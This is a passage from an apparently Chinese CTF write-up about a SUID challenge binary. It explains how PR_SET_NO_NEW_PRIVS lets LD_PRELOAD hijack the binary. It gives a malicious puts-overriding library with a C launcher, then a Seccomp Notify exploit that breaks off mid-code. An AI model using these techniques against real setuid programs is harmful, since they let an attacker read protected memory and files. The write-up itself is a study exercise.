，则打印一条帮助消息，说明可以在此环境变量中指定哪些类别。从 <span class="hljs-string">glibc</span> <span class="hljs-string">2</span>.<span class="hljs-string">3</span>.<span class="hljs-string">4</span>开始，对于 <span class="hljs-built_in">set-user-ID/set-group-ID</span> 二进制文件 ， <span class="hljs-string">LD_DEBUG</span>被忽略。<br></code></pre></td></tr></table></figure><p>事后我去请教了下空白师傅，大意是走不走 LD_PRELOAD 这种变量，其实是根据 SUID <strong>是否真实生效</strong>来判断的。这里通过 prctl <strong>禁止</strong>了 SUID 生效，那么接下来程序内执行的文件就不再当做 SUID 文件处理。</p><ul><li>为什么 prctl 可以禁止 SUID 生效？</li></ul><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">文档</a>是我叠，可以看到 SUID 被点名表扬：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">The</span> execve system call can grant a newly-started program privileges that<br>its parent did not have.  <span class="hljs-title class_">The</span> most obvious examples are setuid/setgid<br>programs and file capabilities.  <span class="hljs-title class_">To</span> prevent the parent program <span class="hljs-keyword">from</span><br>gaining these privileges <span class="hljs-keyword">as</span> well, the kernel and user code must be<br>careful to prevent the parent <span class="hljs-keyword">from</span> doing anything that could subvert the<br>child.  <br>...<br></code></pre></td></tr></table></figure><p>所以我们也可以简单的写出 Exp：</p><p>先整个库，然后简单转换下格式放到 exp 里面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span> &#123;<br>    write(<span class="hljs-number">1</span>,data<span class="hljs-number">-0x100</span>,<span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC a.c -o evil.so<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">char</span> evilso[] = &#123;太长不写&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    FILE *fp = fopen(<span class="hljs-string">&quot;/tmp/evil.so&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(evilso,<span class="hljs-keyword">sizeof</span>(evilso),<span class="hljs-number">1</span>,fp);<br>    fclose(fp);<br>    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">char</span> *envp[] = &#123;<span class="hljs-string">&quot;LD_PRELOAD=/tmp/evil.so&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,args,envp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016135122114.png" alt="image-20221016135122114"></p><h3 id="Exp3-Seccomp-Notify"><a class="header-anchor" href="#Exp3-Seccomp-Notify">¶</a>Exp3(Seccomp Notify)</h3><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023043480.png" alt="image-20221016023043480"></p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023104368.png" alt="image-20221016023104368"></p><p>后来发现上面俩解都不是预期解，实在是太😈了。</p><p>那么观察出题人Discord发言，预期是一个叫 <code>Seccomp Notify</code> 的机制，昂，也能拦截系统调用然后进行劫持。看了<a href="http://just4coding.com/2022/04/03/seccomp/">这篇文章</a>基本的模板就能掌握了。</p><p>由于 <code>Ubuntu 1804</code> 貌似缺了库啥的 <code>Notify</code> 用不了，干脆直接开个 Socat 拿 2204 测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat TCP-LISTEN:6000,fork,reuseaddr EXEC:<span class="hljs-string">&quot;python3 deploy.py&quot;</span>,pty,stderr<br></code></pre></td></tr></table></figure><p>Seccomp Notify 说实话，感觉不如 <code>Ptrace</code> …强。这玩意貌似用途是用来模拟系统调用，没有 <code>Ptrace</code> 那种爸爸打儿子，系统调用参数寄存器都给你 🐑 樂的那种 power :d</p><p>本来准备在官方之前写出来的 XD，结果当鸽子了，那么就直接放官方 exp 好了 XD：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// exploit.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do &#123;                  \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sendfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> fd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">recvfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data, fd;<br>  <span class="hljs-type">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS) &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sigchldHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">seccomp</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> operation, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">void</span> *args)</span> &#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X32_SYSCALL_BIT 0x40000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-type">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">closeSocketPair</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pid_t</span> <span class="hljs-title function_">targetProcess</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-type">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>) 